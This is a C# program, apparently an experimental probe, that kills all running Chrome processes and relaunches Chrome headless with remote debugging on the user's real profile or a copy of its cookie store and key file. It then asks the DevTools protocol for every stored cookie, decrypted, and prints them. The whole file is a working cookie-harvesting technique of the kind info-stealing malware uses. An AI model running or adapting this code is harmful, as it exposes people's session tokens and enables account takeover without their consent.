using System;
using System.Diagnostics;
using System.IO;

// probe2: devtools dump against the REAL profile (all chrome killed first).
// args: [shadow|real] — shadow = copied profile (control), real = actual User Data
public static class Probe2
{
    static string all = "";
    static object box = new object();

    static void Main(string[] args)
    {
        bool real = args.Length > 0 && args[0] == "real";
        string exe = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
        string lad = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string realUd = Path.Combine(lad, @"Google\Chrome\User Data");
        string ud;

        if (real)
        {
            foreach (Process p in Process.GetProcessesByName("chrome")) { try { p.Kill(); } catch { } }
            for (int w = 0; w < 30; w++)
            {
                System.Threading.Thread.Sleep(250);
                if (Process.GetProcessesByName("chrome").Length == 0) break;
                foreach (Process p in Process.GetProcessesByName("chrome")) { try { p.Kill(); } catch { } }
            }
            System.Threading.Thread.Sleep(1000);
            ud = realUd;
            Console.WriteLine("mode=real, chrome killed, using {0}", ud);
        }
        else
        {
            string temp = Path.Combine(Path.GetTempPath(), "sh_p2_" + Guid.NewGuid().ToString("N").Substring(0, 8));
            string shadow = Path.Combine(temp, "ud");
            Directory.CreateDirectory(Path.Combine(shadow, "Default", "Network"));
            File.Copy(Path.Combine(realUd, "Local State"), Path.Combine(shadow, "Local State"), true);
            try
            {
                File.Copy(Path.Combine(realUd, "Default", "Network", "Cookies"),
                          Path.Combine(shadow, "Default", "Network", "Cookies"), true);
                File.Copy(Path.Combine(realUd, "Default", "Network", "Cookies-wal"),
                          Path.Combine(shadow, "Default", "Network", "Cookies-wal"), true);
                Console.WriteLine("cookies+wal copied");
            }
            catch (Exception e) { Console.WriteLine("copy failed: {0}", e.Message); }
            ud = shadow;
            Console.WriteLine("mode=shadow, ud={0}", ud);
        }

        ProcessStartInfo psi = new ProcessStartInfo(exe,
            "--headless=new --remote-debugging-port=0 --user-data-dir=\"" + ud + "\" " +
            "--no-first-run --no-default-browser-check --disable-gpu --disable-extensions " +
            "--enable-logging=stderr --v=0 about:blank");
        psi.CreateNoWindow = true;
        psi.UseShellExecute = false;
        psi.RedirectStandardError = true;
        psi.RedirectStandardOutput = true;
        Process p2 = Process.Start(psi);
        System.Threading.ParameterizedThreadStart reader = delegate(object sr)
        {
            try
            {
                StreamReader r = (StreamReader)sr;
                string ln;
                while ((ln = r.ReadLine()) != null) lock (box) { all += ln + "\n"; }
            }
            catch { }
        };
        System.Threading.Thread t1 = new System.Threading.Thread(reader);
        t1.IsBackground = true; t1.Start(p2.StandardError);
        System.Threading.Thread t2 = new System.Threading.Thread(reader);
        t2.IsBackground = true; t2.Start(p2.StandardOutput);

        string ws = null;
        for (int i = 0; i < 450; i++)
        {
            System.Threading.Thread.Sleep(100);
            lock (box)
            {
                int j = all.IndexOf("DevTools listening on ");
                if (j >= 0)
                {
                    int k = all.IndexOf('\n', j);
                    if (k < 0) k = all.Length;
                    ws = all.Substring(j + 22, k - (j + 22)).Trim();
                    break;
                }
            }
            if (p2.HasExited) { Console.WriteLine("exited rc={0}", p2.ExitCode); break; }
        }
        Console.WriteLine("wsUrl: {0}", ws ?? "NOT FOUND");
        if (ws == null) { lock (box) { string a = all; Console.WriteLine("RAW-HEAD: {0}", a.Length > 400 ? a.Substring(0, 400) : a); } }
        if (ws == null) { DumpLogs(); return; }

        // let the profile fully spin up, then ask twice
        for (int round = 0; round < 2; round++)
        {
            System.Threading.Thread.Sleep(1500);
            var wsc = new System.Net.WebSockets.ClientWebSocket();
            wsc.ConnectAsync(new Uri(ws), System.Threading.CancellationToken.None).Wait(8000);
            byte[] send = System.Text.Encoding.UTF8.GetBytes("{\"id\":1,\"method\":\"Storage.getCookies\"}");
            wsc.SendAsync(new ArraySegment<byte>(send),
                System.Net.WebSockets.WebSocketMessageType.Text, true,
                System.Threading.CancellationToken.None).Wait(8000);
            using (var ms = new MemoryStream())
            {
                byte[] buf = new byte[256 * 1024];
                while (true)
                {
                    var tr = wsc.ReceiveAsync(new ArraySegment<byte>(buf), System.Threading.CancellationToken.None);
                    if (!tr.Wait(30000)) break;
                    var r = tr.Result;
                    if (r.MessageType == System.Net.WebSockets.WebSocketMessageType.Close) break;
                    ms.Write(buf, 0, r.Count);
                    if (r.EndOfMessage) break;
                }
                string body = System.Text.Encoding.UTF8.GetString(ms.ToArray());
                Console.WriteLine("round {0}: {1} bytes | head: {2}", round, ms.Length,
                    body.Length > 260 ? body.Substring(0, 260) + "..." : body);
            }
            try { wsc.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure, "d",
                System.Threading.CancellationToken.None).Wait(500); } catch { }
        }
        DumpLogs();
        try { p2.Kill(); } catch { }
        if (!real)
        {
            try { Directory.Delete(Path.GetDirectoryName(
                Path.GetDirectoryName(Path.GetDirectoryName(ud))), true); } catch { }
        }
    }

    static void DumpLogs()
    {
        lock (box)
        {
            string[] keys = new string[] { "cookie", "oscrypt", "app", "crypt", "ERROR", "ERROR:sql" };
            string[] lines = all.Split('\n');
            int shown = 0;
            for (int i = 0; i < lines.Length && shown < 14; i++)
            {
                string l = lines[i].ToLowerInvariant();
                foreach (string k in keys)
                    if (l.Contains(k) && l.Contains("devtools") == false)
                    { Console.WriteLine("LOG| {0}", lines[i].Trim()); shown++; break; }
            }
        }
    }
}
